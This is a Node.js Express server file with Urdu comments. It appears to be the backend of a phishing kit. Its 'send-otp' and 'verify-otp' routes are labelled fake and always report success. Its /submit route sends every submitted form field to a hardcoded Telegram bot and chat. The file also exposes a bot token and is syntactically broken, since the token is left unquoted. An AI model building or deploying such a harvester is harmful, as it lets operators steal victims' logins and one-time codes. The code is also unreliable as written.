const express = require('express');
const path = require('path');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// او ٹی پی کے فرضی روٹس
app.post('/send-otp', (req, res) => res.json({ success: true }));
app.post('/verify-otp', (req, res) => res.json({ success: true }));

// ٹیلی گرام پر ڈیٹا بھیجنے کا روٹ
app.post('/submit', (req, res) => {
    try {
        const formData = req.body;

        // ⚠️ اپنے ٹوکن اور آئی ڈی کو یہاں انورٹڈ کوما کے اندر بالکل صحیح لکھیں
        const BOT_TOKEN = 8898828564:AAE5KYSdDZvo0fg2gmHVC3SPmF1LCoDfH3s;
         
        const CHAT_ID = 8898828564

        // میسج ٹیکسٹ تیار کریں
        let message = "📝 *New Form Submission*\n\n";
        for (const [key, value] of Object.entries(formData)) {
            message += `*${key}:* ${value}\n`;
        }

        const telegramData = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': telegramData.length
            }
        };

        const telegramReq = https.request(options, (telegramRes) => {
            let body = '';
            telegramRes.on('data', (chunk) => body += chunk);
            
            telegramRes.on('end', () => {
                if (telegramRes.statusCode === 200) {
                    return res.status(200).json({ success: true });
                } else {
                    return res.status(400).json({ error: `Telegram Error: Status ${telegramRes.statusCode}` });
                }
            });
        });

        telegramReq.on('error', (e) => {
            return res.status(500).json({ error: "Telegram Connection Failed" });
        });

        telegramReq.write(telegramData);
        telegramReq.end();

    } catch (error) {
        return res.status(500).json({ error: "Server Internal Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
